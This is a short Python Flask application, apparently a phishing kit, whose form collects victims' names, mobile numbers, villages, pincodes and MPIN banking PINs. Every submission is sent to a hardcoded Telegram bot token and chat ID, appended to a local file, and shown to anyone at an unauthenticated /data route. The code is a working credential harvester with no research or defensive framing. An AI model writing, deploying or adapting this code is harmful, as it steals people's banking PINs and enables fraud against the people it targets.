from flask import Flask, request, render_template
import requests
import os

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    name = request.form.get("name")
    mobile = request.form.get("mobile")
    village = request.form.get("village")
    mpin = request.form.get("mpin")
    pincode = request.form.get("pincode")

    # ✅ Validation
    if not name or not mobile or not village or not mpin or not pincode:
        return "Please fill all fields"

    # ✅ Message format
    msg = f"""
📥 New Data

👤 Name: {name}
📱 Mobile: {mobile}
🏡 Village: {village}
🔐 MPIN: {mpin}
📍 Pincode: {pincode}
"""

    # ✅ Telegram send
    url = "https://api.telegram.org/bot8721390421:AAHMZWDkcyise6LJfGj2RoOoTO06DoHgu2g/sendMessage"
    data = {
        "chat_id": "7021009916",
        "text": msg
    }

    requests.post(url, data=data)

    # ✅ File save
    with open("data.txt", "a") as f:
        f.write(msg + "\n")

    return "Submitted successfully"

# ✅ Data dekhne ke liye
@app.route('/data')
def show_data():
    try:
        with open("data.txt", "r") as f:
            return f.read()
    except:
        return "No data yet"

# ✅ Run server
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
